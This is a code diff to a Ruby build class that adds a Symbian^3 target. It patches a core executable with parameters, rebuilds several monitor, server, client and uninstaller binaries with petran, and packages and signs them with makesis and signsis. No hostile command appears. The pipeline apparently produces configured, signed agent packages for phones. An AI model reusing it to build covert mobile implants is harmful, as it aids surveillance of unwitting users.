@@ -34,8 +34,12 @@ class BuildSymbian < Build
     super
 
     params[:core] = '3rd/SharedQueueMon_20023635.exe'
+    # invoke the generic patch method with the new params
+    super
+
+    params[:core] = 'symbian3/SharedQueueMon_20023635.exe'
     params[:config] = '2009093023'
-    
+
     # invoke the generic patch method with the new params
     super
 
@@ -75,33 +79,42 @@ class BuildSymbian < Build
       end
     end
 
+    FileUtils.cp(path('symbian3/rsc'), path("symbian3/#{uids[0]}.rsc"))
     FileUtils.cp(path('5th/rsc'), path("5th/#{uids[0]}.rsc"))
     FileUtils.cp(path('3rd/rsc'), path("3rd/#{uids[0]}.rsc"))
 
     trace :debug, "Build: rebuilding with petran"
 
+    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[1]} -sid 0x#{uids[1]} -compress #{path('symbian3/SharedQueueMon_20023635.exe')}"
     CrossPlatform.exec path('petran'), "-uid3 0x#{uids[1]} -sid 0x#{uids[1]} -compress #{path('5th/SharedQueueMon_20023635.exe')}"
     CrossPlatform.exec path('petran'), "-uid3 0x#{uids[1]} -sid 0x#{uids[1]} -compress #{path('3rd/SharedQueueMon_20023635.exe')}"
 
+    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[2]} -sid 0x#{uids[2]} -compress #{path('symbian3/SharedQueueSrv_20023634.exe')}"
     CrossPlatform.exec path('petran'), "-uid3 0x#{uids[2]} -sid 0x#{uids[2]} -compress #{path('5th/SharedQueueSrv_20023634.exe')}"
     CrossPlatform.exec path('petran'), "-uid3 0x#{uids[2]} -sid 0x#{uids[2]} -compress #{path('3rd/SharedQueueSrv_20023634.exe')}"
 
+    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[3]} -sid 0x#{uids[3]} -compress #{path('symbian3/SharedQueueCli_20023633.dll')}"
     CrossPlatform.exec path('petran'), "-uid3 0x#{uids[3]} -sid 0x#{uids[3]} -compress #{path('5th/SharedQueueCli_20023633.dll')}"
     CrossPlatform.exec path('petran'), "-uid3 0x#{uids[3]} -sid 0x#{uids[3]} -compress #{path('3rd/SharedQueueCli_20023633.dll')}"
 
+    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[4]} -sid 0x#{uids[4]} -compress #{path('symbian3/Uninstaller.exe')}"
     CrossPlatform.exec path('petran'), "-uid3 0x#{uids[4]} -sid 0x#{uids[4]} -compress #{path('5th/Uninstaller.exe')}"
     CrossPlatform.exec path('petran'), "-uid3 0x#{uids[4]} -sid 0x#{uids[4]} -compress #{path('3rd/Uninstaller.exe')}"
 
+    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[5]} -sid 0x#{uids[5]} -compress #{path('symbian3/UninstMonitor.exe')}"
     CrossPlatform.exec path('petran'), "-uid3 0x#{uids[5]} -sid 0x#{uids[5]} -compress #{path('5th/UninstMonitor.exe')}"
     CrossPlatform.exec path('petran'), "-uid3 0x#{uids[5]} -sid 0x#{uids[5]} -compress #{path('3rd/UninstMonitor.exe')}"
 
     trace :debug, "Build: creating sis files"
 
+    CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('symbian3')}
+    File.exist? path('symbian3/uninstaller.sis') or raise("makesis failed for uninstaller symbian3")
+
     CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('5th')}
-    File.exist? path('5th/uninstaller.sis') or raise("makesis failed for uninstaller")
+    File.exist? path('5th/uninstaller.sis') or raise("makesis failed for uninstaller 5th")
 
     CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('3rd')}
-    File.exist? path('3rd/uninstaller.sis') or raise("makesis failed for uninstaller")
+    File.exist? path('3rd/uninstaller.sis') or raise("makesis failed for uninstaller 3rd")
 
     trace :debug, "Build: creating sisx files"
 
@@ -115,11 +128,14 @@ class BuildSymbian < Build
     # this is global
     FileUtils.cp(Config.instance.cert('symbian.key'), @tmpdir)
 
+    CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('symbian3')}
+    File.exist? path('symbian3/uninstaller.sisx') or raise("signsis failed for uninstaller symbian3")
+
     CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('5th')}
-    File.exist? path('5th/uninstaller.sisx') or raise("signsis failed for uninstaller")
+    File.exist? path('5th/uninstaller.sisx') or raise("signsis failed for uninstaller 5th")
 
     CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('3rd')}
-    File.exist? path('3rd/uninstaller.sisx') or raise("signsis failed for uninstaller")
+    File.exist? path('3rd/uninstaller.sisx') or raise("signsis failed for uninstaller 3rd")
 
     trace :debug, "Build: final installer #{params['edition']}"
 
